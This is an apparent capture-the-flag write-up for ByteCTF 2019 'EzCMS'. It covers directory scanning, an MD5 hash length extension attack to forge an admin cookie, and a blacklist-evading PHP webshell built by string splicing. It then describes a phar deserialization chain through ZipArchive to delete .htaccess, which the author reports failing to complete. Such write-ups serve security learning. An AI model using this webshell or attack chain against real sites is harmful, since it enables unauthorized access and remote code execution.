### References

- [@Zeddyu, ByteCTF 2019 Web WP, 2019-09-17](http://blog.zeddyu.info/2019/09/17/bytectf2019/#EzCMS)
- [@ptr-yudai, Length Extension Attackの原理と実装, 2018-08-28](https://ptr-yudai.hatenablog.com/entry/2018/08/28/205129)

1.Scan dir result:

```tex
❯❯ py .\dirsearch.py -u http://192.168.200.129:8302/ -e php,bak -x 404,403,502

[20:20:52] Starting:
[20:21:01] 200 -    0B  - /config.php
[20:21:03] 200 -  710B  - /index.php
[20:21:03] 200 -  710B  - /index.php/login/
[20:21:08] 200 -  821B  - /upload.php
[20:21:09] 200 -  149B  - /view.php
[20:21:09] 200 -    4KB - /www.zip
```

Download the `www.zip` to get all source code.

2.In `upload.php`, if we want to upload files, we need to bypass some restrictions:

```php
// upload.php
include ("config.php");
if (isset($_FILES['file'])) {
    ...
    $admin = new Admin($file_name, $file_tmp, $file_size);
    $admin->upload_file();
}

// config.php
class Admin {
    function __construct($filename, $file_tmp, $size) {
        ...
        $profile = new Profile();
        $this->checker = $profile->is_admin();
    }
    public function upload_file() {
        if (!$this->checker){
            die('u r not admin');
        }
        ...
    }
}

class Profile {
    public function is_admin(){
        $this->username = $_SESSION['username'];
        $this->password = $_SESSION['password'];
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
        return 0;
    }
}
```

Here we can get the hash from cookie, and we know the length of the secret and key:

```php
function login(){
    $secret = "********";    // length=8
    setcookie("hash", md5($secret."adminadmin"));
    return 1;
}
```

So we can use [hash length extension attack](https://en.wikipedia.org/wiki/Length_extension_attack) to bypass it. The python script used for the attack is from @ptr-yudai, since im so lazy to compile the Hashpump and i use python3.9, so i slightly modified script:

```tex
❯❯ py .\hash_leattack.py
Input Signature: 52107b08c0f3342d2153ae1d68e6262c
Input Data: admin
Input Key Length: 13
Input Data to Add: test
known_md5 = 52107b08c0f3342d2153ae1d68e6262c
new_md5   = bcb7fda11f22c5992de2093ed0e5a654
data      = admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00test
```

the key length is the length of the secret variable plus the length of the username character(8 + len('admin') => 13)

Then we use the `admin` as the useranme, the data output above use as the password and add `user` to the cookie, with the new_md5 output above as the value. Now we can upload files:

![](https://i.imgur.com/eJApbxI.png)

3.We can even upload the php file directly, but the code does some checking of the file content:

```php
// config.php
class Admin {
    public function upload_file() {
        ...
        $this->content_check -> check();
        ...
    }
}

class Check {
    function check() {
        $content = file_get_contents($this->filename);
        $black_list = ['system','eval','exec','+','passthru','`','assert'];
        foreach ($black_list as $k=>$v) {
            if (stripos($content, $v) !== false) {
                die("your file make me scare");
            }
        }
        return 1;
    }
}
```

It is easy to bypass this by string splicing:

```php
<?php
$a = "pass";
$b = "thru";
$c = $a.$b;
$d = @$c($_REQUEST[a]);
```

However, there is a `.htaccess` in the upload directory which prevents our uploaded php files from being parsed, and this `.htaccess` file is generated every time we login:

```php
function __construct($filename, $file_tmp, $size) {
    $this->upload_dir = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']);
    if (!file_exists($this->upload_dir)){
        mkdir($this->upload_dir, 0777, true);
    }
    if (!is_file($this->upload_dir.'/.htaccess')){
        file_put_contents($this->upload_dir.'/.htaccess', 'lolololol, i control all');
    }
    ...
}
public function upload_file() {
    ...
    move_uploaded_file($this->file_tmp, $this->upload_dir.'/'.md5($this->filename).'.'.$ext);
}
```

There appears no way to bypass..

4.After uploading the file we can view the mime of the file by clicking on view detail, in `view.php`:

```php
// view.php
$res = $file->view_detail();
$mine = $res['mine'];

// config.php
class File {
    public function view_detail() {
        if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath)) {
            die("nonono~");
        }
        $mine = mime_content_type($this->filepath);
        ...
    }
}
```

It looks like phar unserialize here, as the `mime_content_type` function can be used to trigger. Although phar is filtered, `php://` can do the same thing.

In `File` calss, there is the only `__destruct` function whole code:

```php
function __destruct() {
    if (isset($this->checker)){
        $this->checker->upload_file();
    }
}
```

And then we see a puzzling `__call` method in the `Profile` class:

```php
function __call($name, $arguments) {
    $this->admin->open($this->username, $this->password);
}
```

The method name `open()` is pretty generic. If we can find a standard class in PHP which has an `open()` method, we can trick the webapp into calling the open() method of that class. Let’s list all classes containing an `open()` method:

```php
<?php
foreach (get_declared_classes() as $class) {
    foreach (get_class_methods($class) as $method) {
        if ($method == "open")
        echo "$class->$method\n";
    }
}
?>

// PHP 7.4.3
❯❯ php .\test.php
SessionHandler->open
ZipArchive->open
XMLReader->open
```

In this article [**Insomnihack Teaser 2018 / File Vault**](https://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault), the author found that the `ZipArchive->open` method can deletes arbitrary files if we give a "9" as a second parameter.

> **The second parameter of `ZipArchive->open()` is to specify additional options. The value `9` is for `ZipArchive::CREATE | ZipArchive::OVERWRITE`.**

```c
// libzip    lib/zip.h

/* flags for zip_open */
#define ZIP_CREATE           1
#define ZIP_EXCL             2
#define ZIP_CHECKCONS        4
#define ZIP_TRUNCATE         8
#define ZIP_RDONLY          16

// php-src    ext/zip/php_zip.h
#include <zip.h>
#ifndef ZIP_OVERWRITE
#define ZIP_OVERWRITE ZIP_TRUNCATE
#endif
```

5.Deleting files is actually triggered on `ZipArchive::close`:

![](https://i.imgur.com/wKy50F1.png)

Because of the following code in libzip:

```c
if ((za->open_flags & ZIP_TRUNCATE) || changed) {    // either 8 or 9
    ...
    zip_discard(za);
    return 0;
}

// lib/zip_discard.c
if (za->src) {
    zip_source_close(za->src);
    zip_source_free(za->src);
}

// lib/zip_source_free.c
free(src); 
```

`ZipArchive::close` in PHP Manual:

> **This method is automatically called at the end of the script.**

So, we just need upload a webshell, construct a `ZipArchive` class phar file to upload, and use `php://filter/resource=phar://` to trigger the phar unserialize to delete the `.htaccess` file in our directory.

```tex
view.php?filename=175e48a8e08dd48b0b263cd4a9cb6fd6.phar&filepath=php://filter/resource=phar://./sandbox/46c01c941bd10a9c3038752f7354f2e8/175e48a8e08dd48b0b263cd4a9cb6fd6.phar
```

But here I failed to reproduce, after generating the phar file, i looked at its contents:

```bash
$ xxd poc.phar | grep "\`"
00000180: 008a 70b3 6003 0000 00d2 6348 88b6 0100  ..p.`.....cH....
```

It contains the \`[grave accent] which is filtered in check function! So i can't upload it. I tried many things, including gzip to compress it, but couldn't get rid of this character.

sad :(

